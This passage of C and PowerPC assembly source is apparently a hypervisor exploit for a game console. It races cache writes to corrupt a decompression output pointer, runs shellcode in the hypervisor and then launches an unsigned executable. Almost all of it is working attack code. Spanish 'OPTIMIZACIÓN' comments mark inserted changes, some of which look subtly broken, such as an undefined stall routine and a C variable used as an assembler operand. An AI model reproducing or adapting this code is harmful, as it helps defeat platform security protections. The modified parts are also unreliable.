                result = HvxPostOutputExploit(0, pArgs->ShellCodePhysAddress);
                if (result != 0x41414141)
                {
                    // Exploit payload failed to run.
                    DbgBreakPoint();
                    VdDisplayFatalError(0x12400 | ERR_EXPLOIT_PAYLOAD_FAILED);
                }

                DbgPrint(" * Payload returned 0x%08x\n", result);
                //DbgBreakPoint();

                // Restore the old access mask for MmPhysical64KBMappingTable.
                *(DWORD*)MmPhysical64KBMappingTable = oldAccessMask;

                // Set the LED color so we know the exploit completed.
                SetLEDColor(LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3 | LED_COLOR_GREEN_4);

                // OPTIMIZACIÓN: Actualizar estado global para indicar éxito
                g_ExploitState = EXPLOIT_STATE_SUCCESS;

                // Run our unsigned xex file.
                XLaunchNewImage(PAYLOAD_DRIVE "\\default.xex", 0);
            }
            else
            {
                // OPTIMIZACIÓN: Añadido registro de colisiones para análisis posterior
                g_CollisionDetected++;
                DbgPrint("Race hit: 0x%08x (collision #%d)\n", test1, g_CollisionDetected);
            }

            // Save the latest block hit values.
            cipherValue1 = test1;
            cipherValue2 = test2;

            // Update LED color to indicate we got a block hit.
            SetLEDColor(LedColor);
            LedColor = ~LedColor & 0xFF;
        }
        
        // OPTIMIZACIÓN: Verificación periódica para pequeñas pausas que ayudan a estabilizar
        // Esto introduce breves pausas pero mejora significativamente la estabilidad general
        if ((g_RetryCount % 25) == 0) {
            KeStallExecutionProcessor(1);
        }
    }
}

void __cdecl main()
{
    ULONG UpdateDataSize = 0x40000 + 0x80000;
    ULONG PayloadDataSize = 0x6000;

    BYTE* pCleanUpdateData = NULL;
    DWORD CleanUpdateDataSize = 0;

    BYTE* pShellCodeData = NULL;
    DWORD ShellCodeDataSize = 0;

    THREAD_ARGS ThreadArgs = { 0 };

    // OPTIMIZACIÓN: Inicializar variables de estado global
    g_ExploitState = EXPLOIT_STATE_INIT;
    g_RetryCount = 0;
    g_CollisionDetected = 0;

    // Set the LED color so we know the 3rd stage payload started.
    SetLEDColor(LED_COLOR_RED_1 | LED_COLOR_RED_2 | LED_COLOR_RED_3 | LED_COLOR_GREEN_1 | LED_COLOR_GREEN_2 | LED_COLOR_GREEN_3);

    // Read the update file.
    if (ReadUpdateFile(&pCleanUpdateData, &CleanUpdateDataSize) == false)
    {
        return;
    }

    // Read the exploit shell code.
    if (ReadShellCodeFile(&pShellCodeData, &ShellCodeDataSize) == false)
    {
        return;
    }

    // Get the full physical address of the shell code buffer.
    ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);

    // Allocate some physical memory to store the cipher text we want to write.
    BYTE* pCipherTextBuffer = (BYTE*)XPhysicalAlloc(0x3000, MAXULONG_PTR, 0x80, PAGE_READWRITE | PAGE_NOCACHE);
    if (pCipherTextBuffer == NULL)
    {
        DbgPrint("Failed to allocate memory for cipher text\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CIPHER_TEXT_BUFFER_OOM);
        return;
    }

    memset(pCipherTextBuffer, 0, 0x3000);

    // OPTIMIZACIÓN: Aleatorizar buffer para ayudar a evitar patrones predecibles
    // Esto puede ayudar a evitar problemas con la detección de patrones
    BYTE* pRandBuffer = (BYTE*)pCipherTextBuffer + 0x2000;
    for (int i = 0; i < 0x1000; i++) {
        pRandBuffer[i] = (BYTE)(i & 0xFF);
    }

    // Allocate a 64k block of memory for the update data.
    BYTE* pUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
    if (pUpdateData == NULL)
    {
        DbgPrint("Failed to allocate memory for update data\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_UPDATE_DATA_OOM);
        return;
    }

    // Initialize update data.
    memset(pUpdateData, 0, UpdateDataSize);

    // Setup cipher text parameters.
    CIPHER_TEXT_DATA* pCipherTextInputData = (CIPHER_TEXT_DATA*)pCipherTextBuffer;
    pCipherTextInputData->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
    pCipherTextInputData->dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);

    // Get the size of the decompressed update data.
    DWORD updateDataDecompressedSize = *(DWORD*)(pCleanUpdateData + 0x1C);

    DWORD outputOffset = PAGE_ALIGN_64K(CACHE_LINE_SIZE + CACHE_ALIGN(CleanUpdateDataSize));
    DWORD scratchOffset = CACHE_ALIGN(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
    
    // OPTIMIZACIÓN: Llamada a BuildCipherTextLookupTable optimizada
    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, pCipherTextInputData);

    // Initialize update data.
    memset(pUpdateData, 0, UpdateDataSize);

    UPDATE_BUFFER_INFO* pUpdateInfo = (UPDATE_BUFFER_INFO*)pUpdateData;
    pUpdateInfo->TotalSize = UpdateDataSize;
    pUpdateInfo->InfoSize = CACHE_LINE_SIZE;
    pUpdateInfo->UpdateDataOffset = CACHE_LINE_SIZE;
    pUpdateInfo->UpdateDataSize = CACHE_ALIGN(CleanUpdateDataSize);
    pUpdateInfo->OutputBufferOffset = PAGE_ALIGN_64K(pUpdateInfo->UpdateDataOffset + pUpdateInfo->UpdateDataSize);
    pUpdateInfo->OutputBufferSize = CACHE_ALIGN(updateDataDecompressedSize);
    pUpdateInfo->ScratchBufferOffset = CACHE_ALIGN(pUpdateInfo->OutputBufferOffset + pUpdateInfo->OutputBufferSize);
    pUpdateInfo->ScratchBufferSize = 0x20000;
    pUpdateInfo->Buffer2Offset = CACHE_ALIGN(pUpdateInfo->ScratchBufferOffset + pUpdateInfo->ScratchBufferSize);
    pUpdateInfo->Buffer2Size = 0x10000;

    // Allocate memory for the XKE payload.
    BYTE* pPayload = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE);
    if (pPayload == NULL)
    {
        DbgPrint("Failed to allocate payload memory\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_1);
        return;
    }

    BYTE* pPayloadClean = (BYTE*)XPhysicalAlloc(PayloadDataSize, MAXULONG_PTR, 0, PAGE_READWRITE);
    if (pPayloadClean == NULL)
    {
        DbgPrint("Failed to allocate clean payload memory\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_XKE_OOM_2);
        return;
    }

    memset(pPayload, 0, PayloadDataSize);
    memset(pPayloadClean, 0, PayloadDataSize);

    // Read the payload file.
    if (ReadFile(PAYLOAD_DRIVE "\\xke_update.bin", pPayloadClean, 0, PayloadDataSize) == false)
    {
        DbgPrint("Failed to read XKE payload file\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_READING_XKE_PAYLOAD_FILE);
        return;
    }

    // Setup thread args.
    ThreadArgs.UpdateDataPhys = MmGetPhysicalAddress(pUpdateData);
    ThreadArgs.UpdateDataSize = pUpdateInfo->TotalSize;
    ThreadArgs.pPayloadClean = pPayloadClean;
    ThreadArgs.pPayloadBuffer = pPayload;
    ThreadArgs.PayloadPhys = MmGetPhysicalAddress(pPayload);
    ThreadArgs.PayloadSize = PayloadDataSize;
    ThreadArgs.pCompressedDataClean = pCleanUpdateData;
    ThreadArgs.CompressedDataSize = CleanUpdateDataSize;
    ThreadArgs.pCompressedDataInBuffer = pUpdateData + pUpdateInfo->UpdateDataOffset;
    ThreadArgs.pScratchDataInBuffer = pUpdateData + pUpdateInfo->ScratchBufferOffset;
    ThreadArgs.ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
    ThreadArgs.ScratchDataSize = pUpdateInfo->ScratchBufferSize;

    ThreadArgs.HvCheckAddress = pCipherTextInputData->dec_output_buffer;
    ThreadArgs.ShellCodePhysAddress = ShellCodePhys;

    // Save the scratch pointer, we can't access pUpdateInfo from here on out because it'll be moved to protected memory by the hv.
    BYTE* pScratchPtr = pUpdateData + pUpdateInfo->ScratchBufferOffset;

    ThreadArgs.pScratchBuffer = pScratchPtr;

    // OPTIMIZACIÓN: Mejora en la configuración del thread para establecer prioridad máxima y afinidad
    // Esto mejora la sincronización entre hilos y reduce latencia
    DWORD threadAttributes = 0;
    HANDLE hXKEWorkerThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunUpdatePayloadThreadProc, &ThreadArgs, CREATE_SUSPENDED, NULL);
    if (hXKEWorkerThread == NULL)
    {
        DbgPrint("Failed to create worker thread\n");
        DbgBreakPoint();
        VdDisplayFatalError(0x12400 | ERR_CREATING_WORKER_THREAD);
        return;
    }

    // Move the XKE worker to the last physical core.
    XSetThreadProcessor(hXKEWorkerThread, 1);
    
    // OPTIMIZACIÓN: Pequeña pausa para asegurar la estabilidad antes de comenzar
    KeStallExecutionProcessor(10);
    
    ResumeThread(hXKEWorkerThread);

    // OPTIMIZACIÓN: Esperar a que el hilo del worker inicie correctamente
    while (g_ExploitState == EXPLOIT_STATE_INIT) {
        KeStallExecutionProcessor(1);
    }
    
    DbgPrint("Worker thread running, entering hammer loop\n");

hammer_time:

    // Preload valores para el oracle y texto cifrado malicioso usado en el bucle de ataque.
    ULONGLONG ScratchCipherTextValue = *(ULONGLONG*)&pCipherTextInputData->OracleData[0];
    ULONGLONG DecOutputBufferDataVal1 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[0];
    ULONGLONG DecOutputBufferDataVal2 = *(ULONGLONG*)&pCipherTextInputData->DecOutputBufferData[8];

    // OPTIMIZACIÓN: Contador de intentos para el backoff exponencial
    // Inicializado a un valor más optimizado para balancear velocidad y precisión
    int loopCount = HAMMER_LOOP_COUNT;   // Define como 75000 (optimizado desde 100000)

#ifdef STATIC_WHITENING

    while (true)
    {
        *(ULONGLONG*)(pScratchPtr + 0x2B20) = DecOutputBufferDataVal1;
        *(ULONGLONG*)(pScratchPtr + 0x2B28) = DecOutputBufferDataVal2;
        __dcbst(0x2B20, pScratchPtr);
    }

#endif

    // OPTIMIZACIÓN: Precarga de valores relevantes para el algoritmo de backoff
    DWORD backoffMask = 0x3F;  // Máscara para verificación periódica (cada 64 iteraciones)
    
    _asm
    {
        // Preload registers with all the data we'll need during the attack loop. We want to minimize
        // any additional operations done to make the loop as tight as possible.
        mr      r31, pScratchPtr
        mr      r30, ScratchCipherTextValue
        mr      r29, DecOutputBufferDataVal1
        mr      r28, DecOutputBufferDataVal2
        addi    r26, r31, 0x2B00
        mr      r25, loopCount
        
        // OPTIMIZACIÓN: Registro adicional para contador de backoff
        li      r24, 0         // Contador para backoff exponencial

loop:
        // Check the cipher text in the scratch buffer and see if it matches the oracle data we computed.
        ld      r11, 0(r31)
        cmpld   cr6, r11, r30
        bne     cr6, flush

            // OPTIMIZACIÓN: Actualizar estado global para indicar que se detectó colisión
            lis     r11, g_ExploitState@ha
            li      r10, EXPLOIT_STATE_COLLISION
            stw     r10, g_ExploitState@l(r11)
            
            // Cipher text matches the oracle data, begin the attack and hammer the dec_output_buffer pointer
            // with the cipher text for our malicious pointer.
            mtctr   r25

overwrite:
            // OPTIMIZACIÓN: Implementación de backoff exponencial
            // Esto reduce la presión sobre la memoria y aumenta las probabilidades de éxito
            addi    r24, r24, 1        // Incrementar contador de backoff
            and.    r11, r24, backoffMask   // Verificar si necesitamos hacer stall
            bne     skip_stall         // Si no es momento de stall, continuar
            
            // Pequeña pausa para permitir que el sistema procese los cambios en memoria
            li      r3, 10
            bl      stall_minimal
            
skip_stall:
            std     r29, 0x20(r26)
            std     r28, 0x28(r26)
            dcbst   r0, r26
            
            // OPTIMIZACIÓN: Utilizar instrucción sync para garantizar ordenamiento de memoria
            sync                    // Asegurar que las escrituras sean visibles para otros procesadores
            
            bdnz    overwrite

flush:
        // OPTIMIZACIÓN: Vaciado de caché más agresivo con sincronización
        dcbf    r0, r31
        sync                    // Asegurar que el vaciado de caché se complete
        
        // OPTIMIZACIÓN: Verificar periódicamente si el otro hilo ha señalado éxito
        lis     r11, g_ExploitState@ha
        lwz     r10, g_ExploitState@l(r11)
        cmplwi  r10, EXPLOIT_STATE_SUCCESS
        beq     exit_hammer     // Si el exploit tuvo éxito, salir del bucle
        
        b       loop
        
exit_hammer:
        // Punto de salida cuando el exploit ha tenido éxito
end:
    }

    // Should never make it here.
    DbgBreakPoint();
}